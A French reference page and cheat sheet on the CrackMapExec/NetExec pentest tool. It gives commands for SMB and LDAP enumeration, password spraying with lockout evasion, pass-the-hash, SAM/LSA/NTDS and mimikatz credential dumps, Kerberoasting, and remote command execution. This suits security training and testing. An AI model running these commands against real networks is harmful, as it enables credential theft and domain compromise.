---
title: CrackMapExec
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [crackmapexec, cme, active-directory, smb, winrm, pentest, sécurité]
date: 2026-03-22
---

# CrackMapExec

CrackMapExec (CME / NetExec) est un couteau suisse pour les tests en environnement Active Directory. Il permet d'énumérer, tester des credentials, exécuter des commandes et collecter des informations sur des réseaux Windows à grande échelle.

```bash
# Installation (NetExec — fork actif de CME)
pip3 install netexec
# ou
apt install netexec

# Commandes disponibles selon le protocole
nxc smb, winrm, ssh, ldap, mssql, rdp, ftp, vnc
```

## SMB — le plus utilisé

### Énumération et tests d'accès

```bash
# Énumération d'un hôte / réseau
nxc smb 192.168.1.10
nxc smb 192.168.1.0/24          # Tout un sous-réseau
nxc smb targets.txt             # Liste de cibles

# Résultat : hostname, OS, signing (SMB signing requis ou non)
# SMB signing: False → vulnérable au relais NTLM

# Vérifier des credentials (spray de password)
nxc smb 192.168.1.0/24 -u alice -p password
nxc smb 192.168.1.0/24 -u users.txt -p password  # Un mot de passe, plusieurs users
nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt --no-bruteforce  # Paires user:pass
nxc smb 192.168.1.0/24 -u alice -H :ntlm_hash  # Pass-the-hash

# Marquage des succès
# [+] = credentials valides
# (Pwn3d!) = admin local sur la machine
```

### Commandes et post-exploitation

```bash
# Exécuter une commande (si admin)
nxc smb 192.168.1.10 -u admin -p password -x "whoami /all"
nxc smb 192.168.1.10 -u admin -p password -X "Get-Process"  # PowerShell

# Dump SAM (hashes locaux)
nxc smb 192.168.1.10 -u admin -p password --sam

# Dump LSA (secrets LSA — credentials en clair parfois)
nxc smb 192.168.1.10 -u admin -p password --lsa

# Dump NTDS (hashes AD — sur un DC)
nxc smb 192.168.1.10 -u admin -p password --ntds

# Dump des sessions actives (utilisateurs connectés)
nxc smb 192.168.1.10 -u admin -p password --sessions

# Dump des utilisateurs locaux
nxc smb 192.168.1.10 -u admin -p password --local-users

# Énumérer les partages
nxc smb 192.168.1.10 -u alice -p password --shares

# Lister le contenu d'un partage
nxc smb 192.168.1.10 -u alice -p password --shares -M spider_plus
```

### Modules

```bash
# Lister les modules disponibles
nxc smb -L

# Mimikatz en mémoire (dump des credentials)
nxc smb 192.168.1.10 -u admin -p password -M mimikatz

# Dump via comsvcs (méthode alternative sans mimikatz)
nxc smb 192.168.1.10 -u admin -p password -M comsvcs_dump

# Vérifier si des systèmes sont vulnérables à EternalBlue (MS17-010)
nxc smb 192.168.1.0/24 -M ms17-010

# Vérifier PrintNightmare (CVE-2021-1675)
nxc smb 192.168.1.0/24 -M printnightmare

# ZeroLogon (CVE-2020-1472)
nxc smb 192.168.1.10 -M zerologon

# Genie (génère un rapport HTML)
nxc smb 192.168.1.0/24 -u alice -p password --generate-report
```

## LDAP — Active Directory

```bash
# Énumération des utilisateurs AD
nxc ldap 192.168.1.10 -u alice -p password --users

# Groupes AD
nxc ldap 192.168.1.10 -u alice -p password --groups

# Machines jointes au domaine
nxc ldap 192.168.1.10 -u alice -p password --computers

# Utilisateurs sans pré-authentification Kerberos (AS-REP Roasting)
nxc ldap 192.168.1.10 -u alice -p password --asreproast asrep_hashes.txt

# Utilisateurs avec SPN (Kerberoasting)
nxc ldap 192.168.1.10 -u alice -p password --kerberoasting kerb_hashes.txt

# Machines avec délégation non contrainte
nxc ldap 192.168.1.10 -u alice -p password --trusted-for-delegation

# Politiques de mots de passe (pour le password spray)
nxc ldap 192.168.1.10 -u alice -p password --password-not-required
nxc ldap 192.168.1.10 -u alice -p password -M get_netlogon_pw_policy
```

## WinRM — exécution à distance (port 5985/5986)

```bash
# Vérifier l'accès WinRM
nxc winrm 192.168.1.10 -u admin -p password

# Shell interactif (evil-winrm)
evil-winrm -i 192.168.1.10 -u admin -p password
evil-winrm -i 192.168.1.10 -u admin -H ntlm_hash

# Exécuter une commande
nxc winrm 192.168.1.10 -u admin -p password -x "whoami"
```

## MSSQL

```bash
# Connexion et test
nxc mssql 192.168.1.20 -u sa -p password

# Exécuter une commande via xp_cmdshell
nxc mssql 192.168.1.20 -u sa -p password -x "whoami"

# Activer xp_cmdshell si désactivé
nxc mssql 192.168.1.20 -u sa -p password -M mssql_privesc

# Énumérer les instances SQL
nxc mssql 192.168.1.0/24
```

## Password Spraying

```bash
# Password spray sur tout un domaine (ATTENTION : risque de lockout)
# Vérifier la politique avant : nxc ldap dc -u user -p password --password-not-required
# et observer le seuil de lockout

# Spray avec un seul mot de passe courant
nxc smb 192.168.1.0/24 -u users.txt -p "Spring2024!" --continue-on-success

# Contournement du lockout : --jitter (délai aléatoire) et --delay
nxc smb 192.168.1.0/24 -u users.txt -p "Password123!" \
    --delay 30 --jitter 15  # Attente 30s ± 15s entre chaque tentative

# Utiliser le format domaine/utilisateur
nxc smb 192.168.1.0/24 -u users.txt -p passwords.txt \
    --continue-on-success --log spray_results.txt
```

## Base de données des résultats

CrackMapExec stocke les résultats dans une base de données SQLite.

```bash
# Consulter les résultats passés
cmedb
> hosts                    # Tous les hôtes
> creds                    # Tous les credentials trouvés
> creds 1                  # Détails d'un credential spécifique
> hosts (domain="DOMAINE")  # Hôtes d'un domaine
> export creds             # Exporter les credentials

# Emplacement de la DB
~/.nxc/workspaces/default/
```

## Cheatsheet

```bash
# Scan rapide du réseau
nxc smb 192.168.1.0/24

# Tester des credentials sur tout le réseau
nxc smb 192.168.1.0/24 -u admin -p password

# Identifier les admins locaux
nxc smb 192.168.1.0/24 -u admin -p password --local-auth

# Dump hashes sur toutes les machines où on est admin
nxc smb 192.168.1.0/24 -u admin -p password --sam --continue-on-success

# Récupérer tous les utilisateurs AD
nxc ldap 192.168.1.10 -u alice -p password --users | tee users_ad.txt

# Kerberoasting en masse
nxc ldap 192.168.1.10 -u alice -p password --kerberoasting kerb.txt && \
hashcat -m 13100 kerb.txt rockyou.txt
```
